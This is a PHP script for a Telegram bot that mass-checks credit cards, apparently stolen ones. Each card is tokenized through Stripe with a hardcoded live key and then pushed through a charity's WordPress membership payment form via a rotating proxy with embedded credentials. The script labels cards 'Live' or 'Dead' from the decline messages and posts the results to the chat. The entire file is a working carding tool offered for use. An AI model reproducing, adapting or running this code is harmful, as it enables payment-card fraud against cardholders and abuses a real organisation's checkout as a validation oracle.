<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mchk") === 0 || strpos($message, "!mchk") === 0 || strpos($message, ".mchk") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 1;
    if (count($aray) > 5){
  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟱 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=ca1e6427-8abe-4e16-a4d5-309b9a13da71c4b585&sid=482a60bf-5af2-45a4-a914-d63875ee91bf727474&pasted_fields=number&payment_user_agent=stripe.js%2F327b5a4b1f%3B+stripe-js-v3%2F327b5a4b1f%3B+card-element&referrer=https%3A%2F%2Famenaustralia.org&time_on_page=282412&key=pk_live_51N1T9rEYhF4M0Q0zIpXEA9YgCXPJbyznNF0qzlcBzyv7Ib0hHFdxT88yoJ5zJa3Nn6e9V2Zs3RbXAzb5HZH2aA9E00RMJu6ufy');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$username = "g7305bhx467p4yl";
$password = "ugv0ew3w009j5ii";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://amenaustralia.org/wp-admin/admin-ajax.php?t=1713142681576');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1713142681576 h2',
'Host: amenaustralia.org',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://amenaustralia.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://amenaustralia.org/membership-registration/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1656%26_fluentform_5_fluentformnonce%3Daf63650288%26_wp_http_referer%3D%252Fmembership-registration%252F%26name_1%255Bfirst_1_3%255D%3DGloo%26name_1%255Blast_1_6%255D%3DSmoke%26email_2%3D'.$id.'%2540gmail.com%26user_role%3Dretired%26input_text%3D'.$id.'%26password%3DGloo%2540123%26name_8%255Bfirst_8_3%255D%3D%26name_8%255Bmiddle_8_4%255D%3D%26name_8%255Blast_8_6%255D%3D%26address_9%255Bstreet_address_9_1%255D%3D%26address_9%255Baddress_line_2_9_2%255D%3D%26address_9%255Bcity_9_3%255D%3D%26address_9%255Bstate_province_9_4%255D%3D%26address_9%255Bzip_postal_code_9_5%255D%3D%26address_9%255Bcountry_9_6%255D%3D%26payment_input_3%3D0%26payment_method%3Dstripe%26__entry_intermediate_hash%3De4d356b380d6414ada8a3804d7767c0f%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');

$result2a = curl_exec($ch);

$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

curl_close($ch);

if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
      $status = "Live 🟡";
      $response = "Zip Mismatch ❎";
    }


elseif (strpos($result2a, "CVV LIVE")){
  $status = "Live 🟢";
$response = "CVV Matched ✅";
  }
elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
  $status = "CVV Live 🟢";
$response = "INSUFFICIENT FUNDS ✅";

  }
elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
  $status = "Live 🟡";
$response = "CCN Live ❎";

  }
elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
  $status = "Live 🟡";
$response = "TRANSACTION NOT ALLOWED";

  }

elseif (strpos($result2a, "DO NOT HONOR")){
  
$status = "Dead 🔴";
$response = "DO NOT HONOR 🚫";
}

elseif (strpos($result2a, "stolen_card")){
  
$status = "Dead 🔴";
$response = "Stolen Card 🚫";
}

elseif (strpos($result2a, "lost_card")){
  $status = "Dead 🔴";
$response = "Lost Card 🚫";
}


elseif (strpos($result2a, "PICKUP CARD")){
  $status = "Dead 🔴";
$response = "PICKUP CARD";
}


elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
  
  $status = "Dead 🔴";
$response = "Incorrect Card Number 🚫";
}


elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
  $status = "Dead 🔴";
$response = "Expired Card 🚫";

  }


elseif (strpos($result2a, 'Thank you for registering!')){
  $status = "Live 🟢";
$response = "Charged 1$ ✅";

  }


elseif (strpos($result2a, "FRAUDULENT")){
  $status = "Dead 🔴";
$response = "Fraudulent 🚫";
}


elseif (strpos($result2a, "lock_timeout")){
  $status = "Dead 🔴";
$response = "error 404 🚫";
}


elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
  $status = "Dead 🔴";
$response = "Generic Decline 🚫";
}


elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
  $status = "Dead 🔴";
$response = "NVAILD EXPIRY MONTH 😥";
}



elseif (strpos($result2a, "Error processing payment")){
  $status = "Dead 🔴";
$response = "Error processing payment";
}

elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
  $status = "Live 🟡";
$response = "CARD NOT SUPPORTED 🚫";
}


elseif (strpos($result2a, "parameter_invalid_empty")){
  $status = "Dead 🔴";
$response = "404 error 🚫";
}

else {
      $status = "Dead 🔴";
$response = "Payment Error 🚫";

    }
//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  MASS CCN CHARGE 1 $  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
